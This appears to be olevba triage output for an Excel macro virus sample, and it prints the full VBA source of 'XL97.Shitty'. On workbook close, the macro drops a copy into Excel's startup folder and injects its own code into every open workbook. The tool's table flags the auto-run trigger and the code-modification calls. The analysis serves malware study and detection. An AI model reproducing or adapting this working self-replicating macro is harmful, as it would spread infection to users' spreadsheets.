olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Quiet-ecadaa283d73ef307be3d6fbfee8ea7bd2ad23bc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSExcel.Quiet-ecadaa283d73ef307be3d6fbfee8ea7bd2ad23bc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSExcel.Quiet-ecadaa283d73ef307be3d6fbfee8ea7bd2ad23bc - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'XL97.Shitty
'by CyberShadow//SMF
Private Sub Workbook_BeforeClose(Cancel As Boolean)
 On Error Resume Next
 fl = 0
 With Application.FileSearch
  .NewSearch
  .LookIn = Application.StartupPath
  .SearchSubFolders = True
  .FileName = "shitty.xls"
  .MatchAllWordForms = True
  .FileType = msoFileTypeAllFiles
  If .Execute() > 0 Then fl = 1
 End With
 If fl = 0 Then Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\shitty.xls", FileFormat:=xlNormal, AddToMru:=False
 Set shitSource = ThisWorkbook.VBProject.VBComponents.Item("ThisWorkbook").CodeModule
 For i = 1 To Workbooks.Count
  Set shitDest = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule
  If shitDest.Lines(1, 1) <> "'XL97.Shitty" Then
   shitDest.InsertLines 1, shitSource.Lines(1, shitSource.CountOfLines)
  End If
 Next
 If fl = 0 Then Workbooks("shitty.xls").Save: Workbooks("shitty.xls").Close
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_BeforeClose|Runs when the Excel Workbook is closed       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

